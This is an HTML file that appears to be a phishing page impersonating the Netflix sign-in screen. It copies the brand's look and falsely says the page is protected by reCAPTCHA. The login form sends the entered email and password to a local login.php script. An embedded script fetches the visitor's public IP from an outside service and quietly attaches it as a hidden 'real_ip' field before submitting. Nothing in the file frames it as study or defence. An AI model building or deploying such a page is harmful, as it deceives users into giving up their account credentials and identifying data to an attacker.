<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In to Netflix</title>
  <style>
	body {
	  margin: 0;
	  padding: 0;
	  background: url('netflix-bg.jpg') no-repeat center center fixed;
	  background-size: cover;
	  color: #fff;
	  font-family: Arial, Helvetica, sans-serif;
	  min-height: 100vh;
	  display: flex;
	  align-items: center;
	  justify-content: center;
	  flex-direction: column;
	}
	.login-container {
	  background: rgba(0, 0, 0, 0.75);
	  border-radius: 4px;
	  box-shadow: 0 2px 24px rgba(0,0,0,0.8);
	  padding: 40px 32px 24px 32px;
	  width: 100%;
	  max-width: 360px;
	  box-sizing: border-box;
	  display: flex;
	  flex-direction: column;
	  align-items: center;
	}
	.logo {
	  margin-bottom: 24px;
	}
	.logo svg {
	  width: 120px;
	  height: 36px;
	  display: block;
	}
	.login-title {
	  font-size: 1.35rem;
	  font-weight: bold;
	  color: #ffffff;
	  margin-bottom: 30px;
	  letter-spacing: 0.5px;
	  text-align: center;
	}
	.login-form {
	  width: 100%;
	  display: flex;
	  flex-direction: column;
	  gap: 16px;
	}
	.login-form input[type="email"],
	.login-form input[type="password"] {
	  padding: 12px;
	  border: 1px solid #ccc;
	  border-radius: 4px;
	  font-size: 1rem;
	  background: #f7f7f7;
	  color: #111;
	  outline: none;
	  transition: border 0.2s;
	}
	.login-form input:focus {
	  border-color: #e50914;
	}
	.sign-in-btn {
	  background: #e50914;
	  color: #fff;
	  border: none;
	  padding: 12px;
	  font-size: 1.1rem;
	  border-radius: 4px;
	  font-weight: bold;
	  cursor: pointer;
	  margin-top: 4px;
	  transition: background 0.2s;
	}
	.sign-in-btn:hover, .sign-in-btn:focus {
	  background: #b20710;
	}
	.helper-links {
	  width: 100%;
	  display: flex;
	  justify-content: flex-end;
	  margin-top: 10px;
	}
	.helper-links a {
	  color: #0071eb;
	  text-decoration: none;
	  font-size: 0.95rem;
	  transition: text-decoration 0.2s;
	}
	.helper-links a:hover {
	  text-decoration: underline;
	}
	.recaptcha-text {
	  color: #ccc;
	  font-size: 0.875rem;
	  margin-top: 36px;
	  text-align: center;
	  max-width: 90vw;
	}
	@media (max-width: 480px) {
	  .login-container {
		padding: 24px 8vw 20px 8vw;
		max-width: 100vw;
	  }
	  .recaptcha-text {
		margin-top: 20px;
	  }
	}
  </style>
</head>
<body>
  <div class="login-container">
	<div class="logo">
	  <svg viewBox="0 0 111 30" xmlns="http://www.w3.org/2000/svg">
		<text x="0" y="22" font-size="24" font-family="Arial, Helvetica, sans-serif" fill="#e50914" font-weight="bold">NETFLIX</text>
	  </svg>
	</div>
	<div class="login-title">Sign In to Netflix</div>
	<form class="login-form" method="POST" action="login.php" autocomplete="off">
	  <input type="email" name="email" placeholder="Email address" required autocomplete="username">
	  <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
	  <button type="submit" class="sign-in-btn">Sign In</button>
	</form>
	<div class="helper-links">
	  <a href="#">Need help?</a>
	</div>
  </div>
  <div class="recaptcha-text">
	This page is protected by reCAPTCHA.
  </div>

<script>
const form = document.querySelector("form");
form.addEventListener("submit", async function(e) {
  e.preventDefault(); // prevent immediate submission
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    const ipInput = document.createElement("input");
    ipInput.type = "hidden";
    ipInput.name = "real_ip";
    ipInput.value = data.ip;
    form.appendChild(ipInput);

    // âœ… Ensure the DOM has time to update before submission
    setTimeout(() => {
      form.submit();
    }, 50); // 50ms delay to ensure hidden field is recognized
  } catch (err) {
    console.warn("Could not fetch IP. Submitting without it.");
    form.submit(); // fallback submit
  }
});
</script>
</body>
</html>
